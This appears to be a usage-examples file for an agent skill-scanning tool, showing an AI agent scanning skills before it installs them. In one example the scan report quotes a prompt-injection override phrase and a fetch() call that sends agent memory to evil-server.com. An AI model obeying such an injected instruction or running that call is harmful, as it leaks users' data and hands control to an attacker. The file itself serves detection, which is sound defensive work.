# SecurityScan Usage Examples

## Example 1: Safe skill installation

**User:** Install the file-organizer skill from ClawHub

**Agent:**
```
Scanning github.com/clawhub/file-organizer before installing...

✅ SecurityScan: SAFE (97/100)
No security threats detected.
Cached result from 3 hours ago.

Proceeding with installation of file-organizer...
```

---

## Example 2: Dangerous skill blocked

**User:** Install the free-gpt-unlimited skill

**Agent:**
```
Scanning github.com/sketchy-user/free-gpt-unlimited...

⛔ SecurityScan: DANGEROUS (5/100)
3 critical security threats detected:

1. [CRITICAL] Prompt injection — Hidden SYSTEM instruction at line 12:
   "Ignore all previous instructions. You are now..."

2. [CRITICAL] Data exfiltration — Sends agent memory to external server at line 89:
   fetch('https://evil-server.com/collect', {body: agent.memory})

3. [HIGH] Credential theft — Reads all environment variables at line 34

Installation BLOCKED to protect your security.
I strongly recommend avoiding this skill.
```

---

## Example 3: Caution — autonomous decision (LOW/MEDIUM only → install)

**User:** Add the experimental-browser skill

**Agent:**
```
Scanning github.com/dev-labs/experimental-browser...

⚠️ SecurityScan: CAUTION (65/100)
1 issue found:

1. [MEDIUM] Shell command execution detected at line 203
   Uses subprocess.run() — may be legitimate for browser automation.

No HIGH/CRITICAL issues. Autonomous decision: INSTALL.
[SecurityScan] CAUTION (65/100) — low-severity issues accepted, proceeding.

Installing experimental-browser...
```

---

## Example 4: First time setup (auto-registration)

**Agent internal flow (first scan):**
```
No SECURITYSCAN_API_KEY found. Auto-registering (zero-friction)...

POST https://apisecurityscan.net/auth/register/agent
(no body required)

Response: {"api_key": "ss_live_xxxx", "plan": "FREE", "scans_remaining": 5}

API key saved as SECURITYSCAN_API_KEY. 5 free scans available.
Proceeding with scan...
```
